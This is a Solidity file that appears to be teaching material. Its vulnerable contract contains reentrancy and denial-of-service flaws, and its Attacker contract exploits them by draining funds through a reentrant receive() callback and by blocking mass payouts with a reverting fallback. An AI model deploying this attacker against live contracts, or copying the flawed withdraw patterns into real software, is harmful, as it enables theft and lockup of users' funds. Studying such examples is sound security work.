// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface IExploitable {
    function deposit() external payable;

    function withdraw() external;

    function withdrawToAll() external;
}

contract Exploitable is IExploitable {
    mapping(address => uint256) public balances;
    address[] public participants;
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function deposit() external payable {
        if (balances[msg.sender] == 0) {
            participants.push(msg.sender);
        }
        // balances[msg.sender] = balances[msg.sender] +  msg.value;
        balances[msg.sender] += msg.value;
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "Not owner");
        _;
    }

    // Access Control
    function withdrawEverything() external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    function changeOwner(address newOwner) external onlyOwner {
        owner = newOwner;
    }

    // Reentrancy
    function withdraw() external {
        uint256 balance = balances[msg.sender];

        if (balance > 0) {
            (bool success, ) = payable(msg.sender).call{value: balance}("");
            if (!success) {
                revert("FAILED");
            }
            balances[msg.sender] = 0;
        }
    }

    // DoS
    // Pull over push
    function withdrawToAll() external {
        uint256 length = participants.length;
        for (uint256 i = 0; i < length; i++) {
            address participant = participants[i];
            uint256 balance = balances[participant];
            balances[participant] = 0;
            (bool success, ) = payable(participant).call{value: balance}("");
            if (!success) {
                revert("FAILED");
            }
        }

        delete participants;
    }
}

contract Attacker {
    enum ATTACK_TYPE {
        DOS,
        REENTRANCY
    }

    address public victim;
    address public owner;
    ATTACK_TYPE public currentAttack;

    constructor(address victim_) {
        victim = victim_;
        owner = msg.sender;
    }

    receive() external payable {
        if (currentAttack == ATTACK_TYPE.REENTRANCY && victim.balance > 0) {
            IExploitable(victim).withdraw();
        } else if (currentAttack == ATTACK_TYPE.DOS) {
            revert("DoS");
        }
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    function attackReentrancy() external payable onlyOwner {
        currentAttack = ATTACK_TYPE.REENTRANCY;
        IExploitable(victim).deposit{value: msg.value}();
        IExploitable(victim).withdraw();
        currentAttack = ATTACK_TYPE.DOS;
    }

    function attackDoS() external payable {
        IExploitable(victim).deposit{value: msg.value}();
    }

    function withdraw() external onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
}
